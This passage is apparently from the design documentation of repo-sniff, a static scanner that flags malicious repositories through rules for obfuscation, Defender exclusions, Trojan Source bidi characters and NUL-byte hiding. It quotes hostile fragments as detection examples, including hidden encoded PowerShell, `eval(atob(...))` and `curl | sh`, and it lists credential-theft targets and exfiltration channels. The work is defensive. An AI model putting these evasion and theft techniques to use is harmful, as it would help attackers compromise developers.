**Known gaps.** The shared limits above.

**ATT&CK.** T1105, T1059.001, T1218.005, T1218.010, T1218.011, T1197.

#### `run.windows-defender-exclusion`

**What it catches.** `Add-MpPreference -ExclusionPath`, `-ExclusionProcess`,
`-ExclusionExtension`; `Set-MpPreference -Disable...`, in the same files as
[`run.windows-remote-code`](#runwindows-remote-code).

**Levels and why.** HIGH: malware hides itself this way, but some honest
developer setup scripts do it for build speed.

**Examples.** `positive/windows/loader.ps1` (`Add-MpPreference
-ExclusionPath "C:\Fixture\Dir"`).

**Known gaps.** The shared limits above; AMSI bypass and the full
defense-evasion family are [planned](#stage-5-running-the-program-code-capabilities)
for milestone 7, where this rule id is superseded rather than reported twice.

**ATT&CK.** T1562.001.

### 3.5 obfuscation

#### `obfuscation.encoded-payload-sink`

**What it catches.** A decoder (`atob`, `Buffer.from(x, "base64" | "hex" |
"latin1" | "binary")`, `unescape`, `String.fromCharCode` with 8 or more codes
or a spread), a base64 string of 64 or more characters with mixed case, or a
string of 16 `\x` or 32 `\u` escapes, reaching a code sink or a command sink
(`execSync`, `execFile`, `spawnSync`; `exec` and `spawn` only when bound from
`child_process`).

**Levels and why.** HIGH: encoded data that ends up as code or a command is
the shape of a loader; honest wasm glue and engine tests do it too.

**Examples.** `positive/encoded/eval-atob/atob.js` (`eval(atob(blob))`),
`exec-base64/exec.js`, `hex-function/hex.js`. Not reported:
`negative/data-near-exec/tool.js`.

**Known gaps.** The shared limits in [3.4](#34-running-the-program); decoding
the payload is milestone 8.

**ATT&CK.** T1027, T1140.

#### `obfuscation.obfuscator-io`

**What it catches.** Output of the obfuscator.io tool: 12 or more `_0x`
names, 4 of them different, that are at least 5 per 1000 characters of the
file or come with a `while(!![])` loop or a string array rotated with `push`
and `shift`.

**Levels and why.**

- CRITICAL when a tool runs the file: a configuration file
  (`*.config.{js,cjs,mjs,ts,cts,mts}`, `*.conf.js`, `.*rc.js`, `gulpfile`,
  `Gruntfile`, `babel.config.*`, `webpack.*`, `rollup.*`, `vite.*`) or a file
  that an npm script starts with `node` (found through `npm run`,
  `concurrently`, `cd dir && ...`).
- HIGH in other source.
- MEDIUM under `dist`, `build`, `out`, `public`, `vendor`, `node_modules`,
  `third_party`, `static`, `assets`, `.next`, `_next`, `bundles` or in
  `*.min.*`, `*.bundle.*`, `*.chunk.*`.
- Names without the structure are one level lower.

The folder name does not remove the finding, because whoever writes the
repository chooses it.

**Examples.** `positive/obfuscator/eslintrc/.eslintrc.js` and
`next-config/next.config.js` (CRITICAL), `npm-start/server/index.js` (started
by an npm script), `obfuscator/dist/dist/app.js` (MEDIUM). Not reported:
`negative/few-hex-names/names.js`.

**Known gaps.** obfuscator.io output with renamed identifiers; the shared
limits in [3.4](#34-running-the-program).

**ATT&CK.** T1027.013.

#### `obfuscation.minified-source`

**What it catches.** A line of 2000 or more characters with less than one
blank in eight and a `;`, `{` or `}` every 80 characters: minified code. A
table of numbers or one base64 string is not code.

**Levels and why.** MEDIUM in source; INFO under the build and vendor folders
listed for [`obfuscation.obfuscator-io`](#obfuscationobfuscator-io); HIGH when
a tool runs the file.

**Examples.** `positive/minified/src/lib/bundle.js` (MEDIUM),
`minified/dist/dist/app.min.js` (INFO). Not reported:
`negative/data-line/src/table.js`, `negative/small-minified/lib/short.js`.

**Known gaps.** The shared limits in [3.4](#34-running-the-program).

**ATT&CK.** T1027.

#### `obfuscation.windows-encoded-payload`

**What it catches.** In the Windows files of
[`run.windows-remote-code`](#runwindows-remote-code): `powershell`, `pwsh`,
`powershell_ise` with `-EncodedCommand` or any prefix down to `-e` and a
base64 operand of 40 or more characters; `certutil -decode` and `-decodehex`;
`IEX` of `FromBase64String`.

**Levels and why.**

- HIGH for the forms above.
- CRITICAL with a hidden window (`-w h`) or a download on the line.
- MEDIUM, "review it by hand", for `-EncodedCommand` with a variable or an
  expansion as the operand, because what runs cannot be read.
- `-ExecutionPolicy Bypass` alone is not reported.

**Examples.** `positive/windows/loader.ps1`: `powershell -NoP -W Hidden -Enc
...` (CRITICAL), `powershell -NoProfile -EncodedCommand ...` (HIGH),
`powershell -enc $payload` (MEDIUM).

**Known gaps.** Decoding `-enc` payloads is milestone 8; the shared limits in
[3.4](#34-running-the-program).

**ATT&CK.** T1027.010, T1140.

### 3.6 deceiving the human

#### `deception.bidi-control`

**What it catches.** Trojan Source: Unicode bidi control characters
(CVE-2021-42574), judged by how the line is displayed.

**Levels and why.**

| Level | When |
|---|---|
| CRITICAL | The display changes, or it cannot be judged. |
| MEDIUM | The controls sit only inside string values of JSON data. |
| LOW | The controls change nothing about the display. |

How the display is judged. For a line with any of U+202A to U+202E or U+2066
to U+2069, the scanner lays the line out with the Unicode Bidirectional
Algorithm twice, as it is and with those nine characters removed, and
compares what is displayed (characters in visual order, and whether each is
drawn mirrored).

- The same display is LOW, "bidi controls present, display unchanged":
  direction helpers of a vendored UI bundle do this (`"<LRE>" + e + "<PDF>"`).
- A different display is CRITICAL. The layout is made for a left-to-right
  base direction (editors, diff views and code hosts) and for the direction
  the text itself chooses (a viewer with automatic direction); a line is
  CRITICAL if either differs.
- Rule L1 is applied, and the characters rule X9 removes (zero-width spaces,
  soft hyphens) are dropped from both displays. U+200E, U+200F and U+061C are
  not controls for this rule and stay in both.

What cannot be judged keeps CRITICAL, and the explanation says why:

- a control next to a word or path character (ASCII letters and digits,
  `_ $ . / \\ -`, looking past other controls and the marks U+200E, U+200F and
  U+061C), because the display does not change but the name does
  (`bash ./setup<LRI>.sh` runs another file than `setup.sh`,
  `"example.com<PDF>"` never equals a host);
- a line with a character that some viewers show as a line break (a lone CR,
  VT, FF, U+001C to U+001E, U+0085, U+2028, U+2029);
- a line over 64 KiB, and every line after a scan has laid out 8 MiB of lines
  (files are read in sorted order, so the same lines are left over on every
  run).

A list of 100 findings is kept for each level, so harmless lines do not hide
a deceptive one; lines past the CRITICAL list are not laid out and are counted
as CRITICAL.

Bidi controls in JSON data. In a `.json` or `.jsonc` file that is data, a
control inside a string value is MEDIUM, "bidi controls in data; not executed
as code" (the Web Platform Tests url test data of `nodejs/node` holds them on
purpose, [#106](https://github.com/z3nghoul/repo-sniff/issues/106)).

- It applies to a line only when the document parses (`.json` as
  `JSON.parse` reads it, `.jsonc` with comments) and every control of the line
  sits inside a string value. A control in a key, in a comment, between
  tokens, or anywhere in a document that does not parse keeps the rule's
  level, and a line whose display is unchanged stays LOW.
- JSON that a tool may read for commands keeps the level whatever it holds,
  and the test is structural, not a list of products: a folder or a file name
  that starts with a dot (`.vscode`, `.devcontainer`, `.claude`, `.cursor`,
  `.roo`, `.release-it.json`, ...), a name ending in `rc.json` or
  `.config.json(c)`, a name that holds `hooks` or `compose`, and a fixed list
  of names (`package.json`, `composer.json`, `deno.json`, `project.json`,
  `workspace.json`, `angular.json`, `nx.json`, `turbo.json`, `vercel.json`,
  `firebase.json`, `lefthook.json`, `tasks.json`, `launch.json`,
  `settings.json`, `mcp.json`, `run.json`, `devcontainer.json` and others in
  `bidi.rs`). A `.code-workspace` is not `.json` and is never data.
- The path does not lower the level (`test/`, `fixtures/`, `wpt/` are judged
  like any folder). A file over the size limit that is read as a stream is not
  parsed and keeps the old level.

**Examples.** `trojan-source/positive/commenting_out.c` (a comment that
displays as code, CRITICAL); `trojan-source/unchanged/rtl_helper.js` (LOW);
`bidi-json-data/positive/data/urltestdata.json` (MEDIUM);
`bidi-json-data/positive/exec/package.json` and `.vscode/tasks.json` (keep the
level). Not reported: `trojan-source/negative/rtl_text.py`,
`ukrainian.txt`, `escaped.rs`.

**Known gaps.**

- A base direction forced to right to left is not modelled (a viewer only
  does that when its user asks, a file cannot).
- A line that starts with a right-to-left mark or Arabic letter flips an
  auto-direction viewer with no control at all
  ([#94](https://github.com/z3nghoul/repo-sniff/issues/94)).
- A rendered Markdown paragraph joins source lines, which this per-line
  judgement does not see.
- Characters newer than the Unicode tables of the `unicode-bidi` crate in use
  (a test pins the defaults of the right-to-left blocks).
- Binary-looking files are read as ASCII only, so the rule cannot match in
  them (see [`deception.nul-byte-in-script`](#deceptionnul-byte-in-script)).

**ATT&CK.** None.

#### `deception.nul-byte-in-script`

**What it catches.** A NUL byte inside a script (script extension or
shebang). Shells such as `dash` drop NUL bytes and run the rest, but tools
that take NUL for the mark of a binary stop reading at it. The script is
scanned like any other text file, so the NUL does not hide what follows it.

**Levels and why.** HIGH: the NUL hides the rest of the script from tools,
not from the shell.

How files with NUL bytes and byte order marks are read (this decides what the
line rules see, for every rule):

- **UTF-16 scripts are not meant here.** A script with a UTF-16 byte order
  mark is decoded from UTF-16, as PowerShell, Windows Script Host, Perl and
  tsc read it (Python, Ruby, Lua and Node cannot run such a file at all). It
  is read by the line rules whatever its first bytes hold (text made only of
  characters such as U+0101 has no NUL byte at all), also when it is over
  5 MiB and read as a stream. U+0000 is dropped, so a UTF-32 LE file reads as
  its own text.
- **Except** a `.bat`, `.cmd`, shell or PHP script, which is read as bytes,
  as `cmd.exe`, the shells and PHP run it after the mark, so the mark cannot
  hide a payload behind UTF-16 garbage and the NUL rule still applies.
- **Every other file** except a recognised executable is read by the line
  rules with the NUL bytes removed, because a script can source it
  (`GIF89a=1` is a valid shell assignment).
- **Binary-looking files.** If a file has a known binary header (archive,
  image, WebAssembly, font), or has NUL bytes and does not read as text (more
  than one byte in eight is NUL, or what is left is not valid UTF-8, as in
  icons and audio), the rules see only its ASCII (every other byte becomes
  U+FFFD). The file is listed as "binary format, ASCII rules only" and each
  finding says "found in a binary-looking file".
- The NUL itself is reported only for scripts.

**Examples.** The unit tests in `src/scan.rs`: a shell script with a NUL in a
comment still reaches the line rules, and a NUL far from the start of a
script is still reported. In the benchmark: cpython's
`Lib/test/archivetestdata/exe_with_zip`, a shell script followed by a zip
archive.

**Known gaps.**

- UTF-16 in non-script files and UTF-16 without a byte order mark are not
  decoded.
- By design, a rule for a non-ASCII character (Trojan Source bidi, later
  zero-width) cannot match in a binary-looking file, because on noise it would
  match by chance ([#51](https://github.com/z3nghoul/repo-sniff/issues/51)).
- A shell script with an appended archive is reported HIGH, a known false
  positive ([#42](https://github.com/z3nghoul/repo-sniff/issues/42)).

**ATT&CK.** T1027.

## 4. planned detections

Detections that are designed but have no rule yet. Each lands with the
milestone named in [ROADMAP.md](../ROADMAP.md), and the exact set for a
milestone is agreed before it starts.

### stage 0: the repository itself

| Detection | Level | ATT&CK |
|---|---|---|
| Binary "test files" referenced by a build script (the xz backdoor pattern) | CRITICAL | T1195.001 |
| Password-protected archives | HIGH | T1027 |
| Committed Python virtual environment (`pyvenv.cfg`, `site-packages/`), reported as a finding of its own; the `.pth` files inside are still judged normally ([#12](https://github.com/z3nghoul/repo-sniff/issues/12)) | MEDIUM | — |
| Submodules pointing at third-party URLs | MEDIUM | — |
| Large high-entropy files of unknown format | MEDIUM | T1027 |

### stage 1: opening in an IDE

| Detection | Level | ATT&CK |
|---|---|---|
| `.vscode/settings.json` overriding the interpreter, terminal or environment | HIGH | — |
| `Directory.Build.props` / `Directory.Build.targets`, custom MSBuild tasks (Visual Studio evaluates them on project load) | HIGH | T1127.001 |
| .NET analyzers / source generators shipped as DLLs in the repo (a binary runs inside the IDE) | CRITICAL | — |
| `.devcontainer` with `postCreateCommand` / `postStartCommand` | MEDIUM, with network HIGH | — |
| `.idea` run configurations, `.envrc` (direnv) | MEDIUM | — |

### stage 2: installing dependencies

| Detection | Level | ATT&CK |
|---|---|---|
| `setup.py` containing code other than the `setup()` call | HIGH | T1195.001 |
| Custom build backend inside the repo (pyproject.toml) | HIGH | T1195.001 |
| Lockfile resolving a package from outside the official registry | HIGH | T1195.001 |
| Typosquatted package names | HIGH | T1195.001 |
| Dependencies from git or a URL instead of the registry | MEDIUM | — |
| Known vulnerabilities via OSV | MEDIUM, critical CVE HIGH | — |
| binding.gyp, composer scripts, Rakefile / Gemfile with code | MEDIUM | — |
| Dockerfile with `curl \| sh` | MEDIUM | T1105 |

### stage 3: building

| Detection | Level | ATT&CK |
|---|---|---|
| `gradle-wrapper.jar` not matching the official hash, or `distributionUrl` not on services.gradle.org | CRITICAL | T1195.001 |
| Rust proc-macro doing I/O or networking (runs at compile time) | CRITICAL | T1195.001 |
| `build.rs` with networking, process spawning or writes outside `OUT_DIR` | HIGH, with obfuscation CRITICAL | T1195.001 |
| `.vcxproj` Pre/PostBuildEvent, MSBuild `<Exec>` | HIGH, with `powershell -enc` or a download CRITICAL | T1127.001 |
| CMake: `execute_process`, `file(DOWNLOAD)`, `ExternalProject` / `FetchContent` from a third-party URL | HIGH | T1105 |
| Makefile or configure with `curl \| sh`, base64 | HIGH | T1105 |
| Gradle tasks with exec or download, Maven exec-plugin | MEDIUM to HIGH | — |
| `go:generate` (only runs when invoked manually) | LOW | — |

### stage 4: tests

| Detection | Level | ATT&CK |
|---|---|---|
| `conftest.py` or pytest plugins with network or exec (pytest loads them automatically) | HIGH | — |
| npm `test` script with suspicious commands | MEDIUM | — |

### stage 5: running the program (code capabilities)

| Detection | Level | ATT&CK |
|---|---|---|
| Chain "download → write → make executable → run" | CRITICAL | T1105 |
| Shellcode and injection: `VirtualAlloc`/`VirtualAllocEx` with RWX, `WriteProcessMemory`, `CreateRemoteThread`, `mprotect(PROT_EXEC)`, `ptrace` | CRITICAL | T1055 |
| Disabling defenses: Defender exclusions (`Add-MpPreference`, `Set-MpPreference`), AMSI bypass | CRITICAL | T1562.001 |
| Crypto mining (`stratum+tcp://`, xmrig) | CRITICAL | T1496 |
| Ransomware behavior: `vssadmin delete shadows`, mass file enumeration and encryption | CRITICAL | T1490, T1486 |
| Data theft: browser passwords and cookies (`Login Data`, `Cookies`), Discord tokens, Telegram `tdata`, crypto wallets, `~/.ssh`, `~/.aws` | HIGH, with network CRITICAL | T1555.003, T1539, T1552 |
| Exfiltration via Discord/Telegram webhooks or bot API, pastebin, ngrok, .onion, hard-coded IPs | HIGH | T1567 |
| Persistence: registry Run keys, schtasks, services, cron, systemd, LaunchAgents, `.bashrc`/`.profile`, Startup folder, WMI subscriptions | HIGH | T1547.001, T1053, T1543, T1546.004, T1546.003 |
| Keylogging (`SetWindowsHookEx`, `GetAsyncKeyState`), clipboard address swapping (clipper) | HIGH | T1056.001, T1115 |
| UAC bypass (fodhelper / eventvwr registry keys) | HIGH | T1548.002 |
| Anti-VM and anti-debugging (VM, sandbox and debugger checks) | HIGH | T1497, T1622 |
| Loading code from bytes (`Assembly.Load(byte[])`, `defineClass`, `marshal.loads`) | HIGH | T1620 |
| Screenshots | MEDIUM | T1113 |
| Auto-update without signature or hash verification | MEDIUM | — |
| Plain process spawning | LOW | T1106 |

### stage 6: deceiving the human

| Detection | Level | ATT&CK |
|---|---|---|
| Code hidden with whitespace past the edge of the screen (beyond ~column 200) or after hundreds of blank lines | CRITICAL | T1027 |
| Invisible (zero-width) characters and homoglyphs in identifiers (Cyrillic `а` instead of Latin `a`) | HIGH | T1036 |
| README advising "disable your antivirus", "download the password-protected zip", `curl \| bash` | HIGH | T1204 |

### obfuscation

Decoded content is scanned again recursively, with limits on depth and size.
Related techniques: T1027 (Obfuscated Files or Information), T1140
(Deobfuscate/Decode).

| Type | Decoding |
|---|---|
| Base64, hex, character-code arrays (`String.fromCharCode`, `chr()`) | yes |
| gzip/zlib inside base64 (`zlib.decompress(b64decode(...))`) | yes |
| XOR with a single-byte key | yes, by brute-forcing all 256 keys |
| String concatenation from pieces, reversed strings | partially |
| PowerShell `-EncodedCommand`, `IEX`, backtick escaping | yes |

Detected but not decoded:

- JS packers: `eval(function(p,a,c,k,e,d)`, obfuscator.io (`_0x...` names,
  rotated string arrays), JSFuck.
- Python: `exec(compile(...))`, `marshal`, lambda chains, PyArmor.
- Calls through reflection or dynamic imports (`getattr(__import__(...))`).
- High-entropy strings (Shannon entropy), minified code among normal sources.

### kinds of execution we look for

1. **Process spawning:** `system`, `popen`, `exec*`, `CreateProcess`,
   `ShellExecute`, `WinExec`, `subprocess`, `os.system`, `child_process`,
   `Runtime.exec`, `ProcessBuilder`, `Process.Start`, `std::process::Command`.
2. **LOLBins** (legitimate Windows programs abused by attackers, T1218):
   `certutil`, `mshta`, `rundll32`, `regsvr32`, `bitsadmin`,
   `wscript`/`cscript`, `powershell -enc`.
3. **Dynamic code execution:** `eval`, `exec`, `new Function`, `vm.run*`,
   `compile`, `importlib`, `Assembly.Load`, `defineClass`.
4. **Native code:** `dlopen`, `LoadLibrary`, `ctypes`, JNI, P/Invoke into
   sensitive APIs.
5. **In-memory execution:** shellcode, RWX memory, injection into other
   processes.
6. **Automatic execution at a stage:** IDE open, install, build, tests
   (stages 1–4).
7. **Deferred execution:** persistence (cron, schtasks, services, etc.).

### review points

Besides **findings**, the report will have a separate **"Needs manual
review"** section for places where static analysis cannot reach a verdict but
a human should take a look.

- Review points **do not affect the risk score** (or only minimally);
  otherwise honest repositories would constantly get "medium risk".
- Every point explains **why** the scanner cannot decide and **what** exactly
  to check by eye.
- Identical points are grouped and the total is capped ("12 network requests
  in 3 files", not 12 separate lines).
- Each kind is implemented together with the analysis layer it belongs to,
  not as a separate milestone at the end.

| Blind spot | What the report shows |
|---|---|
| Payload downloaded later | Every place where a network response flows into `exec`/`eval`/a file write, and a list of all URLs and domains in the code (details below). |
| Encryption | Decryption calls (AES, Fernet, CryptoJS.decrypt) whose result goes into execution or code loading. |
| Malicious logic on ordinary APIs | **Capability map**: a short summary of what the program can do, compared with the README. |
| Logic bombs | Conditions guarding dangerous actions (details below). |
| Binary contents | Import tables, SHA-256, code signature and strings of PE/ELF/Mach-O files (details below). |
| Bugdoors | Risky spots at LOW: `strcpy`, `sprintf`, `gets`, `memcpy` without a size check, `unsafe` blocks in Rust. |
| Dependency code | Young or changed packages, via registry APIs (details below). |
| Binaries in Releases | Whether releases contain exe/zip files instead of a build (details below). |
| Custom VM / bytecode | Large numeric arrays + a loop with `switch`/`match` over "opcodes": "possible code virtualization". |
| Steganography | Code that reads pixels or bytes of an image and executes the result (T1027.003). |

Details:

- **Payload downloaded later:** URLs and domains are flagged when they are
  raw IPs, pastebin, raw gists, URL shorteners or dynamic DNS.
- **Encryption:** especially next to a high-entropy blob.
- **Capability map:** network, files in the home directory, processes.
- **Logic bombs:** hard-coded future dates, hostname or username checks,
  environment variables, **system language and keyboard layout** (malware
  often switches on or off by locale; T1480, T1614.001).
- **Binary contents:** import tables of PE/ELF/Mach-O (crate `goblin`), e.g. a
  `.dll` importing `VirtualAllocEx` + `WriteProcessMemory`; SHA-256; presence
  of a code signature; strings from the binary (URLs, IPs). Optional:
  VirusTotal hash lookup with the user's own key (hash only, the file is never
  uploaded).
- **Dependency code:** via registry APIs (npm, crates.io, PyPI): packages
  published a few days ago, with tiny download counts, or with a changed
  owner. Committed `vendor/` and `node_modules/` are scanned as ordinary code.
- **Binaries in Releases:** via the GitHub API: whether releases contain
  exe/zip files and whether the README says to download releases instead of
  building. Marked "binary not verified against the source".
- **Steganography:** separately, as a finding rather than a review point:
  data appended after `IEND` (PNG) or `EOI` (JPEG).

**What stays truly blind** (stated honestly in the README): malicious logic
built from ordinary APIs with no suspicious signals, real encryption with a
key fetched from outside, and deliberate vulnerabilities that use no risky
functions. Even for these, the report still points at the entry point.

## 5. scanner hardening

**The scanner is a target too.** A malicious repository may attack the
scanner itself. The requirements below are design guarantees with tests where
they exist in the code; the localization item is a requirement for milestone
6. None of them is a proof that the scanner is free of bugs or that a
repository is safe: a clean result means "no rule matched in what was read",
and the report says what was not read.

**Reading files.**

- Never follow symlinks.
- Limits on file size, decoding recursion depth and number of files. A file
  up to 5 MiB is read whole. A file from 5 MiB up to 100 MiB (the size at
  which GitHub refuses a push) is read as a stream, line by line, so memory
  stays small, and only the line rules look at it; a file-level or JSONC rule
  that selects it cannot run, so it is listed as too large. A line over 16 MiB
  in a streamed file, and any file over 100 MiB, make the scan inconclusive.
- Never unpack archives (zip-bomb protection), only flag them.
- Regular expressions only through the `regex` crate (linear-time matching,
  protection against ReDoS).
- Structured files (JSON-like) are parsed rather than matched line by line,
  with a nesting limit, so comments and escapes cannot hide a setting and a
  deeply nested file cannot overflow the stack.
- A script (by extension or shebang) with a NUL byte is read as text, so the
  NUL does not hide what follows it, and the NUL itself is a finding.

**Nothing is skipped silently.**

- Binary, oversized, symlinked and unreadable files, and `.git` folders (not
  walked into; the one at the root is listed as git metadata, a nested one
  makes the scan inconclusive), are all listed in the report. Special files
  such as FIFOs and devices are not listed yet (roadmap,
  [#36](https://github.com/z3nghoul/repo-sniff/issues/36)).
- Rules that select files by name (such as `.pth` and `.start`) run on the
  raw bytes before the binary check, and also see oversized files and
  symlinks, so "too big" or "a link" is not a way around them.
- Rules that judge a file by its name and first 8 KiB (the repository
  contents family, `engine = "head"`) see every entry: files read whole or as
  a stream, files over the size limit (only their first 8 KiB is read) and
  symlinks (only the first 8 KiB of an in-repository target is read, however
  many links point at it).

**Work per file is bounded.**

- A line rule lists at most 100 findings per rule per file; the rest are
  counted and the report says "N more findings in this file not shown" with
  the levels. The limit is per rule, and one rule has one level, so a flood
  from one rule cannot push another rule's CRITICAL finding out.
- The `.pth` check never analyses a line beyond 4096 bytes: a longer one is
  CRITICAL by itself.
- Line rules of a streamed file stop at a line over 16 MiB (inconclusive); the
  regex engine runs in linear time. Memory for a streamed file is one line,
  and up to three times that for a binary-looking one.

**Cloning.** Remote repositories are cloned shallowly over `https` only
(`ssh`, `http://` and `git://` are refused; a private repository is cloned by
its owner and the folder scanned).

- `git` runs with an empty environment plus a short allow-list of variables,
  with its user and system configuration replaced by an empty file and with an
  empty temporary directory as its home (`HOME` and `USERPROFILE`). So git
  before 2.32, which ignores `GIT_CONFIG_GLOBAL`, still cannot read
  `~/.gitconfig`, and no version reads `~/.config/git/attributes` or lets curl
  read `~/.netrc`.
- The system attributes file (`$(prefix)/etc/gitattributes`, writable by the
  user on Homebrew and per-user Git for Windows installs) is skipped with
  `GIT_ATTR_NOSYSTEM`. So no filter, credential helper or fsmonitor from any
  configuration runs, and `GIT_CONFIG_*` variables do not reach it.
- Hooks and templates are off, symlinks are written as plain files, objects
  are checked, submodules are not fetched, and nothing can ask a question
  interactively.
- The `--ref` value is passed to git as a single validated argument, and error
  text coming back from a git server is cleaned before it is printed.

**Credentials in a URL** (`https://TOKEN@host/...`) are hidden in the notice,
the report label and error messages, git's own text included.

- A URL with an `@` after the first `/`, `?`, `#` or `\`, or with two `@`
  before the host (user information holding one of them unescaped), or with
  whitespace, a control character, a quote, an angle bracket or a backtick, is
  refused before anything is printed or git starts, without repeating it: curl
  would take the part before such a character for the host, print it in its
  error and send it to the DNS resolver or a proxy.
- Wherever such text still appears in a message, the user information is
  taken to end at the last `@`, so it is hidden whole (an `@` later in a path
  or query hides more than needed, never less).
- A target without a scheme that is taken for a local folder
  (`TOKEN@github.com/o/r`) is shown in errors with everything before its last
  `@` hidden.
- An scp-like address with any user (`deploy:TOKEN@host:path`) is taken for an
  ssh target and refused without repeating it, and its user information,
  except the plain `git` user, is hidden wherever such an address appears in a
  message.

**An inconclusive scan is never reported as clean.** When the file limit was
reached, a file was too large or could not be read, a line of a large file was
too long to analyze, a nested `.git` repository was not read, or an
executable binary was not reported by any rule, the report ends with
`Scan: INCONCLUSIVE` and the exit status is 3 even with `--fail-on none`.

- An executable binary is ELF, PE, Mach-O including fat binaries, found by
  magic bytes whatever the file is called. A PE is found by the `PE\0\0`
  signature its `e_lfanew` points at, up to 256 MiB into the file, even when
  its first 8 KiB has no NUL byte. An `MZ` file without that signature, such
  as a 16-bit DOS, NE or LE program that 64-bit Windows does not run, is read
  as data.
- With the built-in rules every executable is a finding of the repository
  contents family (HIGH, CRITICAL when disguised, MEDIUM only for a validated
  Java class), which names it. It is still listed as an executable whose code
  was not analyzed, and only a finding of a rule that names executables
  (`names_executables`) takes the place of the inconclusive status.
- Other binary files that were read are listed as "binary format, ASCII rules
  only" and do not change the status.

**The report cannot be painted over.** Text taken from the scanned repository
(task labels, file names) is passed through `display_safe` before it is
reported, so it cannot inject terminal escape sequences, forge extra lines or
reorder text with bidi characters.

**Localizations** load only from the built-in set and the OS config
directory, never from the scanned repository, so a repository cannot change
what the report says. Third-party locale text is stripped of control, bidi and
zero-width characters, cannot carry raw terminal escape sequences, and
severity codes (CRITICAL, HIGH, ...) are always shown untranslated.

**False positives.** A `.repo-sniff.toml` file holds exclusions, each with a
**mandatory justification** field. A benchmark on popular honest repositories
(for example ripgrep) targets "0 critical on clean repos", with the results
published in the README.

**What we scan.** The branch or tag the user is going to build (the default
branch unless told otherwise), not the whole history. For a remote
repository the ref is chosen with `--ref` (a branch or tag).

**Implementation order.** Stages 0–3 (automatic execution) and stage 6
(Trojan Source, whitespace hiding) first, because they give the most value
for the least effort. Then stage 5 capabilities, then obfuscation decoding.
The exact set of detections for each milestone is agreed before it starts.

## 6. exit status and binary files

`repo-sniff scan` exits with 0 when nothing reached `--fail-on` and the scan
was complete, 1 when a finding reached it, 2 when the scan could not run, and
3 when nothing reached it but the scan was inconclusive. Findings win over an
inconclusive scan.

| Status | Meaning |
|---|---|
| 0 | Nothing reached the `--fail-on` threshold, and the scan was not inconclusive. |
| 1 | The scan found something at or above the threshold. |
| 2 | The scan could not run (bad target, clone failure, wrong options). |
| 3 | Nothing reached the threshold, but the scan was **inconclusive**. |

- Status 0 still lists the files the scanner did not analyze in the report.
- Status 3 means one of: the file limit was reached, a file was too large or
  could not be read, a line of a large file was too long to analyze, a nested
  `.git` repository was not read, or an executable binary was not reported by
  any rule.

A scan that could not vouch for what it looked at is never reported as clean:
the report ends with `Scan: INCONCLUSIVE`, says why, and the exit status is 3
even with `--fail-on none`; findings at the threshold still take precedence
(exit 1). This makes `repo-sniff scan . --fail-on high` usable as a CI check
without mistaking "nothing found in what was read" for "safe".

How binary files affect the status:

- An executable binary (ELF, PE with its `PE\0\0` signature, Mach-O, fat
  Mach-O, found by magic bytes whatever the file is called) is a finding of
  the repository contents family: HIGH, CRITICAL when its name hides it, so it
  fails the default threshold. It is also listed as an executable whose code
  was not analyzed. With `--fail-on critical` or `--fail-on none` a plainly
  named executable is shown but does not fail the scan. One that no rule that
  names executables reported would make the scan inconclusive.
- A Java class file whose header checks out is MEDIUM (bytecode a runtime
  loads), so it does not fail the default threshold.
- Other binary files (images, archives, compressed test data) are read by the
  line rules as ASCII only and listed as `binary format, ASCII rules only`;
  they do not change the status.
- The `.git` folder at the root is listed as `git metadata, not analyzed` and
  does not change the status; a nested `.git` folder makes the scan
  inconclusive.
- Images, archives, symlinks that no check had to read and the root `.git`
  folder are listed and do not change the status.

## 7. how the scanner protects you

`repo-sniff` does not run code from the scanned repository: no install, no
build, no scripts. It reads files. That is a design rule, not a promise of
absolute safety. The scanner parses hostile input, so it can have bugs, and a
clean result never proves that a repository is harmless. The full list of
requirements is in [5. scanner hardening](#5-scanner-hardening).

- **Cloning.** Remote repositories are cloned over `https` only, shallowly,
  by a `git` that runs with an empty environment, an empty configuration and
  an empty home directory. No filter, credential helper or fsmonitor from
  your own or the system's git configuration runs, hooks and templates are
  off, symlinks are written as plain files (the scanner then reads them as
  links from the clone's own index), and submodules are not fetched. There
  are no interactive prompts. Your git credentials are never used: a private
  repository fails with a message saying so (see
  [Private repositories](../README.md#self-scan-and-private-repositories)).
- **Secrets.** A token pasted into a URL (`https://TOKEN@host/...`) is hidden
  in the notice, the report and error messages. A URL whose password holds an
  unescaped `/`, `?` or `#` is refused before anything is sent (curl would
  take part of it for the host), and so is an scp-like address with any user
  (`deploy:TOKEN@host:path`), which is an ssh target.
- **Reading.** Symlinks are listed, not followed, with one exception: a
  symlinked VS Code tasks file or `.code-workspace` is judged through the
  regular file inside the repository it points at. If that target cannot be
  read for certain (a link to another link, a name that differs between Unix
  and Windows, a path through a directory link, a target over the limit), the
  link is listed as unreadable and the scan is inconclusive. File names and
  text taken from the repository are cleaned before they are printed, so a
  hostile repository cannot paint over the report.
- **Limits.** The work is bounded. The walk stops after 100,000 files. A file
  over 100 MiB is not read. A file over 5 MiB is read as a stream, line by
  line, and only the line rules look at it; a line over 16 MiB is not
  analyzed. Reads through symlinks are capped at 64 MiB per scan. Reaching
  the file limit, a file or line over its limit and the symlink cap each make
  the scan inconclusive instead of passing silently.
- **Honesty.** A scan is never reported as clean when it cannot vouch for what
  it looked at: the report says `INCONCLUSIVE` and the exit status is 3 (see
  [exit status and binary files](#6-exit-status-and-binary-files)).

## 8. analysis layers and how rules are built

The layers, in the order of [ROADMAP.md](../ROADMAP.md):

1. **Automatic execution** (milestone 2, in progress): IDE settings (VS Code
   settings, devcontainer, `.idea` run configurations, `.envrc`), committed
   virtual environments, MSBuild props and targets and .NET analyzers shipped
   as DLLs, npm lifecycle scripts, `setup.py` and build backends, other
   ecosystem hooks (Dockerfile, composer, Gemfile, `binding.gyp`, Maven),
   build scripts (`build.rs`, `.vcxproj` build events, CMake, Makefile,
   Gradle), GitHub Actions workflows, `.git/config` of a local repository,
   suspicious files (password-protected archives, data after an image),
   third-party submodules, human deception (zero-width characters,
   homoglyphs, README advice to disable the antivirus).
2. **Report and scoring** (milestone 3): colored output, JSON, a risk score
   on three axes (trigger, capability, concealment), a correlation pass, and
   `.repo-sniff.toml` filters and exclusions.
3. **SARIF, GitHub Action, release binaries** (milestone 4).
4. **Capabilities and AST** (milestone 7): tree-sitter for Python,
   JavaScript, C/C++ and more; process spawning, persistence, injection,
   credential theft, exfiltration. Risk comes from *combinations* of
   capabilities, not from single matches.
5. **Obfuscation** (milestone 8): entropy, long base64/hex blobs, minified
   code among normal sources, recursive decoding.
6. **Dependencies** (milestone 9): typosquatting, known vulnerabilities via
   OSV, known malicious packages, lockfiles that resolve outside the registry.
7. **Later**: comparing what a README claims with what the code can do.

